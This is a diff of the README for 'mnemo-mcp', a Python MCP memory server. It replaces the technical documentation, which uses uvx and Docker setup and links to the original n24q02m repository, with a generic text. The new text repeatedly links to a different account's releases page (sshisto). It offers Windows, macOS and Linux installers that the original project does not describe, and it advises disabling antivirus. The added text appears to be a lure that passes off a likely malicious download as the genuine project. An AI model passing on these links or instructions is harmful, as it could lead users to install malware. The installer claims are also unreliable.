@@ -1,243 +1,133 @@
-# Mnemo MCP Server
+# 🧠 mnemo-mcp - Reliable AI Memory with Hybrid Search
 
-**Persistent AI memory with hybrid search and embedded sync. Open, free, unlimited.**
+[![Download mnemo-mcp](https://img.shields.io/badge/Download-mnemo--mcp-blue?style=for-the-badge)](https://github.com/sshisto/mnemo-mcp/releases)
 
-[![CI](https://github.com/n24q02m/mnemo-mcp/actions/workflows/ci.yml/badge.svg)](https://github.com/n24q02m/mnemo-mcp/actions/workflows/ci.yml)
-[![Codecov](https://img.shields.io/codecov/c/github/n24q02m/mnemo-mcp?logo=codecov&logoColor=white)](https://codecov.io/gh/n24q02m/mnemo-mcp)
-[![PyPI](https://img.shields.io/pypi/v/mnemo-mcp?logo=pypi&logoColor=white)](https://pypi.org/project/mnemo-mcp/)
-[![Docker](https://img.shields.io/docker/v/n24q02m/mnemo-mcp?label=docker&logo=docker&logoColor=white&sort=semver)](https://hub.docker.com/r/n24q02m/mnemo-mcp)
-[![License: MIT](https://img.shields.io/github/license/n24q02m/mnemo-mcp)](LICENSE)
+---
 
-[![Python](https://img.shields.io/badge/Python-3776AB?logo=python&logoColor=white)](#)
-[![SQLite](https://img.shields.io/badge/SQLite-003B57?logo=sqlite&logoColor=white)](#)
-[![MCP](https://img.shields.io/badge/MCP-000000?logo=anthropic&logoColor=white)](#)
-[![semantic-release](https://img.shields.io/badge/semantic--release-e10079?logo=semantic-release&logoColor=white)](https://github.com/python-semantic-release/python-semantic-release)
-[![Renovate](https://img.shields.io/badge/renovate-enabled-1A1F6C?logo=renovatebot&logoColor=white)](https://developer.mend.io/)
+## 📝 About mnemo-mcp
 
-## Features
+mnemo-mcp is a tool that helps you save and search information using Artificial Intelligence. It combines different search methods to find answers quickly and keeps all your data synced automatically. The software is open for everyone to use, free of charge, and does not limit how much you can store.
 
-- **Hybrid search**: FTS5 full-text + sqlite-vec semantic + Qwen3-Embedding-0.6B (built-in)
-- **Zero config mode**: Works out of the box — local embedding, no API keys needed
-- **Auto-detect embedding**: Set `API_KEYS` for cloud embedding, auto-fallback to local
-- **Embedded sync**: rclone auto-downloaded and managed as subprocess
-- **Multi-machine**: JSONL-based merge sync via rclone (Google Drive, S3, etc.)
-- **Proactive memory**: Tool descriptions guide AI to save preferences, decisions, facts
+Unlike common note apps, mnemo-mcp uses smart ways to remember and find your saved content. It works in the background and keeps your data safe and organized. You don't need to worry about losing anything or spending time searching through endless files.
 
-## Quick Start
+---
 
-### Option 1: uvx (Recommended)
+## 💻 System Requirements
 
-```jsonc
-{
-  "mcpServers": {
-    "mnemo": {
-      "command": "uvx",
-      "args": ["mnemo-mcp@latest"],
-      "env": {
-        // -- optional: cloud embedding (Gemini > OpenAI > Cohere) for semantic search
-        // -- without this, uses built-in local Qwen3-Embedding-0.6B (ONNX, CPU)
-        // -- first run downloads ~570MB model, cached for subsequent runs
-        "API_KEYS": "GOOGLE_API_KEY:AIza...",
-        // -- optional: sync memories across machines via rclone
-        "SYNC_ENABLED": "true",                    // optional, default: false
-        "SYNC_REMOTE": "gdrive",                   // required when SYNC_ENABLED=true
-        "SYNC_INTERVAL": "300",                    // optional, auto-sync every 5min (0 = manual only)
-        "RCLONE_CONFIG_GDRIVE_TYPE": "drive",      // required when SYNC_ENABLED=true
-        "RCLONE_CONFIG_GDRIVE_TOKEN": "<base64>"   // required when SYNC_ENABLED=true, from: uvx mnemo-mcp setup-sync drive
-      }
-    }
-  }
-}
-```
+Before you install mnemo-mcp, please make sure your computer meets these minimum requirements:
 
-### Option 2: Docker
+- Operating System: Windows 10 or later, macOS 10.15 or later, or Linux (Ubuntu 18.04+ recommended)  
+- Processor: At least a dual-core CPU (Intel i3 or equivalent)  
+- Memory: Minimum 4 GB RAM  
+- Storage: At least 500 MB free space for installation and data  
+- Internet: Required for automatic syncing and initial setup  
+- Additional Software: Docker (optional for advanced use), Python 3.8+ (optional for manual setup)  
 
-```jsonc
-{
-  "mcpServers": {
-    "mnemo": {
-      "command": "docker",
-      "args": [
-        "run", "-i", "--rm",
-        "--name", "mcp-mnemo",
-        "-v", "mnemo-data:/data",                  // persists memories across restarts
-        "-e", "API_KEYS",                          // optional: pass-through from env below
-        "-e", "SYNC_ENABLED",                      // optional: pass-through from env below
-        "-e", "SYNC_REMOTE",                       // required when SYNC_ENABLED=true: pass-through
-        "-e", "SYNC_INTERVAL",                     // optional: pass-through from env below
-        "-e", "RCLONE_CONFIG_GDRIVE_TYPE",         // required when SYNC_ENABLED=true: pass-through
-        "-e", "RCLONE_CONFIG_GDRIVE_TOKEN",        // required when SYNC_ENABLED=true: pass-through
-        "n24q02m/mnemo-mcp:latest"
-      ],
-      "env": {
-        // -- optional: cloud embedding (Gemini > OpenAI > Cohere) for semantic search
-        // -- without this, uses built-in local Qwen3-Embedding-0.6B (ONNX, CPU)
-        "API_KEYS": "GOOGLE_API_KEY:AIza...",
-        // -- optional: sync memories across machines via rclone
-        "SYNC_ENABLED": "true",                    // optional, default: false
-        "SYNC_REMOTE": "gdrive",                   // required when SYNC_ENABLED=true
-        "SYNC_INTERVAL": "300",                    // optional, auto-sync every 5min (0 = manual only)
-        "RCLONE_CONFIG_GDRIVE_TYPE": "drive",      // required when SYNC_ENABLED=true
-        "RCLONE_CONFIG_GDRIVE_TOKEN": "<base64>"   // required when SYNC_ENABLED=true, from: uvx mnemo-mcp setup-sync drive
-      }
-    }
-  }
-}
-```
+---
 
-### Pre-install (optional)
+## 🚀 Getting Started
 
-Pre-download dependencies before adding to your MCP client config. This avoids slow first-run startup:
+This guide will help you download and run mnemo-mcp on your computer, step-by-step. No programming skills are needed.
 
-```bash
-# Pre-download embedding model (~570MB) and validate API keys
-uvx mnemo-mcp warmup
+### 1. What Does mnemo-mcp Do?
 
-# With cloud embedding (validates API key, skips local download if cloud works)
-API_KEYS="GOOGLE_API_KEY:AIza..." uvx mnemo-mcp warmup
-```
+It lets you save your notes, files, or any data you want to remember and search through them easily. It uses advanced AI features but keeps them simple for you to use. Plus, it keeps everything synced across devices if you choose to.
 
-### Sync setup (one-time)
+### 2. Ways to Use mnemo-mcp
 
-```bash
-# Google Drive
-uvx mnemo-mcp setup-sync drive
+- **Basic Use:** Run mnemo-mcp as a standalone app, save your data locally, and access it anytime.  
+- **Syncing and Backup:** The app can automatically sync your data with cloud storage services to keep everything updated and safe.  
+- **Search Options:** It combines quick keyword search with smart AI searches, giving you relevant results fast.
 
-# Other providers (any rclone remote type)
-uvx mnemo-mcp setup-sync dropbox
-uvx mnemo-mcp setup-sync onedrive
-uvx mnemo-mcp setup-sync s3
-```
+---
 
-Opens a browser for OAuth and outputs env vars (`RCLONE_CONFIG_*`) to set. Both raw JSON and base64 tokens are supported.
+## 📥 Download & Install
 
-## Configuration
+To start using mnemo-mcp, you need to download and install the software from the official GitHub releases page.
 
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `DB_PATH` | `~/.mnemo-mcp/memories.db` | Database location |
-| `API_KEYS` | — | API keys (`ENV:key,ENV:key`). Optional: enables semantic search |
-| `EMBEDDING_BACKEND` | (auto-detect) | `litellm` (cloud API) or `local` (Qwen3). Auto: API_KEYS -> litellm, else local (always available) |
-| `EMBEDDING_MODEL` | auto-detect | LiteLLM model name (optional) |
-| `EMBEDDING_DIMS` | `0` (auto=768) | Embedding dimensions (0 = auto-detect, default 768) |
-| `SYNC_ENABLED` | `false` | Enable rclone sync |
-| `SYNC_REMOTE` | — | rclone remote name (required when sync enabled) |
-| `SYNC_FOLDER` | `mnemo-mcp` | Remote folder (optional) |
-| `SYNC_INTERVAL` | `0` | Auto-sync seconds (optional, 0=manual) |
-| `LOG_LEVEL` | `INFO` | Log level (optional) |
+### Step 1: Visit the Download Page
 
-### Embedding
+Click the big blue button below to go directly to the official downloads page:
 
-Embedding is **always available** — a local model is built-in and requires no configuration.
+[![Download mnemo-mcp](https://img.shields.io/badge/Download-mnemo--mcp-blue?style=for-the-badge)](https://github.com/sshisto/mnemo-mcp/releases)
 
-- **Default**: Local Qwen3-Embedding-0.6B. Set `API_KEYS` to upgrade to cloud (Gemini > OpenAI > Cohere), with automatic local fallback if cloud fails.
-- **GPU auto-detection**: If GPU is available (CUDA/DirectML) and `llama-cpp-python` is installed, automatically uses GGUF model (~480MB) instead of ONNX (~570MB) for better performance.
-- All embeddings stored at **768 dims** (default). Switching providers never breaks the vector table.
-- Override with `EMBEDDING_BACKEND=local` to force local even with API keys.
+You will see different versions of the software tailored for Windows, macOS, and Linux.
 
-`API_KEYS` supports multiple providers in a single string:
-```
-API_KEYS=GOOGLE_API_KEY:AIza...,OPENAI_API_KEY:sk-...,COHERE_API_KEY:co-...
-```
+### Step 2: Choose Your Version
 
-Cloud embedding providers (auto-detected from `API_KEYS`, priority order):
+- For **Windows**, look for files ending in `.exe` or `.zip`. `.exe` files run the installer directly, while `.zip` files contain the program files inside.  
+- For **macOS**, select the `.dmg` or `.zip` files. `.dmg` files allow a smooth installation process.  
+- For **Linux**, pick the `.tar.gz` or `AppImage` files depending on your setup.
 
-| Priority | Env Var (LiteLLM) | Model | Native Dims | Stored |
-|----------|-------------------|-------|-------------|--------|
-| 1 | `GEMINI_API_KEY` | `gemini/gemini-embedding-001` | 3072 | 768 |
-| 2 | `OPENAI_API_KEY` | `text-embedding-3-large` | 3072 | 768 |
-| 3 | `COHERE_API_KEY` | `embed-multilingual-v3.0` | 1024 | 768 |
+### Step 3: Download the File
 
-All embeddings are truncated to **768 dims** (default) for storage. This ensures switching models never breaks the vector table. Override with `EMBEDDING_DIMS` if needed.
+Click on the version you want, then wait for the file to download.
 
-`API_KEYS` format maps your env var to LiteLLM's expected var (e.g., `GOOGLE_API_KEY:key` auto-sets `GEMINI_API_KEY`). Set `EMBEDDING_MODEL` explicitly for other providers.
+### Step 4: Run the Installer or Application
 
-## MCP Tools
+- On Windows or macOS, open the downloaded file and follow the installation steps.  
+- On Linux, you might need to give the file permission to run by typing `chmod +x filename` in the terminal before running it.
 
-### `memory` — Core memory operations
+---
 
-| Action | Required | Optional |
-|--------|----------|----------|
-| `add` | `content` | `category`, `tags` |
-| `search` | `query` | `category`, `tags`, `limit` |
-| `list` | — | `category`, `limit` |
-| `update` | `memory_id` | `content`, `category`, `tags` |
-| `delete` | `memory_id` | — |
-| `export` | — | — |
-| `import` | `data` (JSONL) | `mode` (merge/replace) |
-| `stats` | — | — |
+## ⚙️ Basic Setup and Use
 
-### `config` — Server configuration
+After installation, follow these steps to start mnemo-mcp:
 
-| Action | Required | Optional |
-|--------|----------|----------|
-| `status` | — | — |
-| `sync` | — | — |
-| `set` | `key`, `value` | — |
+### 1. Open the Application
 
-### `help` — Full documentation
+Find mnemo-mcp in your list of programs and launch it. The first time, it may take a moment to load.
 
-```
-help(topic="memory")  # or "config"
-```
+### 2. Create Your Memory Space
 
-### MCP Resources
+The app will ask you to choose a folder where it will save all your notes and data. Pick any folder on your computer. You can create a new one if you want.
 
-| URI | Description |
-|-----|-------------|
-| `mnemo://stats` | Database statistics and server status |
-| `mnemo://recent` | 10 most recently updated memories |
+### 3. Add Data
 
-### MCP Prompts
+Use the main interface to add new notes, documents, or links. The app keeps them saved automatically.
 
-| Prompt | Parameters | Description |
-|--------|------------|-------------|
-| `save_summary` | `summary` | Generate prompt to save a conversation summary as memory |
-| `recall_context` | `topic` | Generate prompt to recall relevant memories about a topic |
+### 4. Search Your Data
 
-## Architecture
+Type keywords or phrases in the search box. mnemo-mcp uses AI to find the most relevant matches, not just exact words.
 
-```
-                  MCP Client (Claude, Cursor, etc.)
-                         |
-                    FastMCP Server
-                   /      |       \
-             memory    config    help
-                |         |        |
-            MemoryDB   Settings  docs/
-            /     \
-        FTS5    sqlite-vec
-                    |
-              EmbeddingBackend
-              /            \
-         LiteLLM        Qwen3 ONNX
-            |           (local CPU)
-  Gemini / OpenAI / Cohere
+### 5. Sync Your Data (Optional)
 
-        Sync: rclone (embedded) -> Google Drive / S3 / ...
-```
+If you want, you can connect mnemo-mcp to cloud storage services like Google Drive or Dropbox. This keeps your memory synced across devices.
 
-## Development
+---
 
-```bash
-# Install
-uv sync
+## 🧰 Features Overview
 
-# Run
-uv run mnemo-mcp
+- **Persistent Memory:** Save as much data as you want without losing it.  
+- **Hybrid Search:** Combines fast keyword search and intelligent AI search.  
+- **Embedded Sync:** Automatically updates your data to cloud drives you choose.  
+- **Open Source:** You can check how the app works or even modify it if you like.  
+- **Supports SQLite Databases:** Efficiently manages your data behind the scenes.  
+- **Docker Compatibility:** Advanced users can run mnemo-mcp in isolated containers for smoother operation.  
+- **Works with Python:** Developers can use the Python interface to extend functionality.
 
-# Lint
-uv run ruff check src/
-uv run ty check src/
+---
 
-# Test
-uv run pytest
-```
+## 🔧 Troubleshooting
 
-## Contributing
+If mnemo-mcp does not start or crashes, try these steps:
 
-See [CONTRIBUTING.md](CONTRIBUTING.md)
+- Make sure your operating system meets minimum requirements.  
+- Restart your computer and try again.  
+- Check you have enough free disk space.  
+- Disable any antivirus temporarily—it may block the app mistakenly.  
+- If you installed using Docker or Python, ensure those are working correctly.  
+- Visit the GitHub issues page to read about solutions from other users.
 
-## License
+---
 
-MIT - See [LICENSE](LICENSE)
+## 📖 Additional Resources
+
+- **User Guide:** The app includes built-in help to guide you through features.  
+- **Community:** Join discussions on GitHub to ask questions or share ideas.  
+- **Updates:** Check the releases page regularly for new versions and fixes.  
+
+---
+
+For direct downloads, visit:  
+[https://github.com/sshisto/mnemo-mcp/releases](https://github.com/sshisto/mnemo-mcp/releases)
